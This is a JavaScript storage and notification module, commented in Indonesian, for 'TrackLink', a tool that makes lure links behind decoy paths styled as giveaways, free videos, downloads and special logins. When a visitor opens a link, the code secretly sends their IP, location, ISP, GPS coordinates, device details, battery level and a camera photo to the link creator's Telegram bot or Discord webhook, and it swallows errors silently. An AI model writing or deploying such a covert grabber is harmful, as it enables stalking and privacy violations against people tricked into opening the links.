/**
 * Storage — TrackLink
 * Config + notification settings di-encode ke URL agar bekerja cross-browser
 */

const STORAGE_KEY  = 'tracker_links';
const SETTINGS_KEY = 'tracker_settings';

/* ── Settings ─────────────────────────────────────────────── */
export function getSettings() {
  try { return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}'); }
  catch { return {}; }
}
export function saveSettings(s) {
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
}

/* ── Config encode/decode ─────────────────────────────────── */
export function encodeConfig(config) {
  return btoa(unescape(encodeURIComponent(JSON.stringify(config))))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

export function decodeConfig(encoded) {
  try {
    const b64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(decodeURIComponent(escape(atob(b64))));
  } catch { return null; }
}

/* ── Links (dashboard history) ────────────────────────────── */
export function getLinks() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
  catch { return []; }
}
export function saveLinks(links) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(links));
}

const THEME_PATHS = {
  article:  'berita/info-terkini',
  giveaway: 'hadiah/pemenang-beruntung',
  video:    'video/nonton-gratis-hd',
  download: 'unduh/aplikasi-gratis',
  survey:   'survey/berhadiah-jutaan',
  login:    'masuk/akun-spesial',
};

export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
  const links    = getLinks();
  const settings = getSettings();
  const id       = generateId();
  const theme    = decoyTheme || 'article';

  const config = {
    id,
    decoyTheme: theme,
    options: { trackIp, trackDevice, trackBattery, trackCamera },
    // Encode notif credentials agar pengunjung bisa kirim ke Telegram/Discord creator
    notif: {
      tg: (settings.telegramToken && settings.telegramChatId)
        ? { token: settings.telegramToken, chatId: settings.telegramChatId }
        : null,
      dc: settings.discordWebhook || null,
    },
  };

  const encoded  = encodeConfig(config);
  // Path bertema agar URL terlihat natural
  const themePath = THEME_PATHS[theme] || 'info/terbaru';

  const newLink = {
    id,
    name: name || `Link #${links.length + 1}`,
    encoded,
    themePath,
    decoyTheme: theme,
    options: config.options,
    captures: [],
    createdAt: new Date().toISOString(),
  };
  links.unshift(newLink);
  saveLinks(links);
  return newLink;
}

export function getLinkById(id) {
  return getLinks().find(l => l.id === id) || null;
}

export function addCapture(linkId, capture, notifOverride) {
  const links = getLinks();
  const idx   = links.findIndex(l => l.id === linkId);
  const captureWithMeta = { ...capture, id: generateId(), at: new Date().toISOString() };

  if (idx !== -1) {
    links[idx].captures.push(captureWithMeta);
    saveLinks(links);
  }

  // Gunakan notif dari URL config (pengunjung) atau settings lokal (creator)
  const settings   = notifOverride || getSettings();
  const linkName   = idx !== -1 ? links[idx].name : 'TrackLink';
  sendNotification(settings, linkName, linkId, captureWithMeta);
  return idx !== -1 ? links[idx] : null;
}

export function deleteLink(id) { saveLinks(getLinks().filter(l => l.id !== id)); }
export function clearLinks()   { saveLinks([]); }

/* ── Notification ─────────────────────────────────────────── */
export async function sendNotification(settings, linkName, linkId, cap) {
  const tg = settings.tg || (settings.telegramToken && settings.telegramChatId
    ? { token: settings.telegramToken, chatId: settings.telegramChatId }
    : null);
  const dc = settings.dc || settings.discordWebhook || null;

  if (tg?.token && tg?.chatId) {
    try {
      await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: tg.chatId,
          text: buildTelegramMsg(linkName, cap),
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      if (cap.photo) {
        const blob = await (await fetch(cap.photo)).blob();
        const fd   = new FormData();
        fd.append('chat_id', tg.chatId);
        fd.append('photo',   blob, 'capture.jpg');
        fd.append('caption', `📷 Foto — ${linkName}`);
        await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
          method: 'POST', body: fd,
        });
      }
    } catch { /* silent */ }
  }

  if (dc) {
    try {
      await fetch(dc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: '🎯 TrackLink',
          embeds: [{
            title:  `🔔 Capture Baru — ${linkName}`,
            color:  0x22c55e,
            fields: buildDiscordFields(cap),
            timestamp: new Date().toISOString(),
          }],
        }),
      });
    } catch { /* silent */ }
  }
}

function buildTelegramMsg(linkName, cap) {
  const lines = [`🎯 <b>CAPTURE BARU!</b>`, `📌 Link: <b>${linkName}</b>`, ``];
  if (cap.ip)      lines.push(`🌍 <b>IP:</b> <code>${cap.ip}</code>`);
  if (cap.country) lines.push(`📍 <b>Lokasi:</b> ${[cap.city, cap.region, cap.country].filter(Boolean).join(', ')}`);
  if (cap.isp)     lines.push(`📡 <b>ISP:</b> ${cap.isp}`);
  if (cap.lat)     lines.push(`🗺 <b>Koordinat:</b> <a href="https://maps.google.com/?q=${cap.lat},${cap.lon}">${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}</a>${cap.locationSource === 'GPS' ? ` ✓ GPS ±${cap.gpsAccuracy}m` : ' (IP)'}`);
  if (cap.device)  lines.push(`📱 <b>Perangkat:</b> ${cap.device}`);
  if (cap.os)      lines.push(`💻 <b>OS:</b> ${cap.os} — ${cap.browser}`);
  if (cap.battery !== undefined && cap.battery !== null)
    lines.push(`🔋 <b>Baterai:</b> ${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`);
  lines.push(``, `⏱ ${new Date(cap.at || Date.now()).toLocaleString('id-ID')}`);
  return lines.join('\n');
}

function buildDiscordFields(cap) {
  const f = [];
  if (cap.ip)      f.push({ name: '🌍 IP',        value: `\`${cap.ip}\``,  inline: true });
  if (cap.country) f.push({ name: '📍 Lokasi',     value: [cap.city, cap.region, cap.country].filter(Boolean).join(', '), inline: true });
  if (cap.isp)     f.push({ name: '📡 ISP',        value: cap.isp,          inline: true });
  if (cap.lat)     f.push({ name: '🗺 Koordinat',  value: `[${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}](https://maps.google.com/?q=${cap.lat},${cap.lon})`, inline: true });
  if (cap.device)  f.push({ name: '📱 Perangkat',  value: cap.device,       inline: true });
  if (cap.os)      f.push({ name: '💻 OS/Browser', value: `${cap.os} — ${cap.browser}`, inline: true });
  if (cap.battery !== undefined && cap.battery !== null)
    f.push({ name: '🔋 Baterai', value: `${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`, inline: true });
  if (cap.locationSource === 'GPS')
    f.push({ name: '📡 Sumber', value: `GPS ±${cap.gpsAccuracy}m`, inline: true });
  return f;
}

function generateId() {
  return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}
